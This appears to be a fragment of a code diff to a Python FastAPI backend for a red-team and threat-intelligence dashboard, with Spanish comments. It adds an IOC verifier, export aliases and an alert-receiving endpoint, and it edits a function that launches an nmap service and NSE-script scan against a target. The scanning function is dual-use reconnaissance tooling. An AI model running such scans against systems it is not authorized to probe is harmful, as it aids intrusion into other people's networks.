+        "verified_at": _ioc_dt.now().isoformat(),
+    }
+
+
+@app.get("/api/tip/iocs/verify")
+async def tip_iocs_verify_get():
+    """Verifica todos los IOCs almacenados."""
+    iocs = _load_json(IOC_FILE, [])
+    if not iocs:
+        return {"ok": True, "results": [], "total": 0, "alive": 0}
+
+    with _ioc_pool.ThreadPoolExecutor(max_workers=8) as pool:
+        results = list(pool.map(_verify_single_ioc, iocs[:50]))
+
+    alive_count = sum(1 for r in results if r.get("alive"))
+    return {
+        "ok": True,
+        "results": results,
+        "total": len(results),
+        "alive": alive_count,
+        "dead": len(results) - alive_count,
+        "verified_at": _ioc_dt.now().isoformat(),
+    }
+
+# == END IOC VERIFIER ==================================================
+
 
 
 # COMPATIBILITY ENDPOINTS - Frontend usa paths sin /v2/
@@ -5621,6 +6240,23 @@ async def compat_export_csv():
                         headers={"Content-Disposition": "attachment; filename=redteam_export.csv"})
     except Exception as e:
         return JSONResponse({"error": f"Export failed: {str(e)}"}, status_code=500)
+
+@app.get("/api/export/json")
+async def compat_export_json_explicit():
+    """Alias explicito de /api/export para que ExportPanel.tsx (que pide /api/export/{fmt}) funcione con fmt=json."""
+    return await compat_export_json()
+
+@app.get("/api/export/pcap")
+async def compat_export_pcap():
+    return JSONResponse(
+        {"error": "PCAP no disponible: requiere scapy + permisos raw socket. No soportado en Termux sin root."},
+        status_code=501
+    )
+
+@app.post("/api/reports/generate")
+async def compat_reports_generate(request: Request):
+    """Alias de /api/v2/reports/generate sin el prefijo /v2/ (asi lo llama ExportPanel.tsx)."""
+    return await v2_generate_report(request)
 
 @app.post("/api/export")
 async def compat_export_post(request: Request):
@@ -5727,7 +6363,7 @@ def _kraken_save(target, hosts_data):
 
 def _kraken_scan_sync(target: str):
     scripts_str = ','.join(KRAKEN_NSE_SCRIPTS)
-    cmd = ['nmap', '-sV', '-O', '--script', scripts_str, '-p', KRAKEN_PORTS, '-oX', '-', target]
+    cmd = ['nmap', '-sV', '--script', scripts_str, '-p', KRAKEN_PORTS, '-oX', '-', target]  # -O quitado: requiere root, abortaba el scan completo en Termux sin privilegios
     try:
         proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
         out, err = proc.communicate(timeout=180)
@@ -5866,6 +6502,29 @@ else:
 #  MAIN — debe ir al FINAL para que todos los @app endpoints se registren
 # ═════════════════════════════════════════════════════════════════════════════
 
+
+# ── PHANTOM (GHOST HUNTER) — recibir alertas del master node :8002 ────────────
+@app.post("/api/phantom/alert", dependencies=[Depends(require_auth)])
+async def phantom_alert(payload: Dict[str, Any] = Body(default={})):
+    """Recibe hallazgos críticos del orquestador GHOST HUNTER PHANTOM."""
+    severity = payload.get("severity", "medium")
+    title = payload.get("title", "Hallazgo PHANTOM")
+    # Broadcast por WebSocket a todos los clientes conectados
+    await broadcast_ws({
+        "event": "phantom_alert",
+        "severity": severity,
+        "title": title,
+        "data": payload,
+        "timestamp": now_iso(),
+    })
+    # Persistir como evidencia
+    try:
+        alert_file = EVIDENCE_DIR / f"phantom_alert_{int(time.time()*1000)}.json"
+        alert_file.write_text(json.dumps(payload, indent=2, default=str))
+    except Exception:
+        pass
+    return {"status": "received", "severity": severity}
+
 if __name__ == "__main__":
     import uvicorn
     import socket as _socket
@@ -5900,6 +6559,7 @@ if __name__ == "__main__":
     print(f"  → geo_intel: {'OK' if _GEO_INTEL_OK else 'NOT AVAILABLE'}", flush=True)
     print(f"  → Sin mocks. Sin dummy data. Solo datos reales.", flush=True)
     print(f"  → ARTO AI: {'OK' if _ARTO_OK else 'NOT AVAILABLE'}", flush=True)
+    print(f"  → LEVIATHAN: {'OK' if _LEVIATHAN_OK else 'NOT AVAILABLE'}", flush=True)
     _seed_v2_if_empty()
     print("═" * 60, flush=True)
     uvicorn.run(app, host=host, port=port, log_level="info")
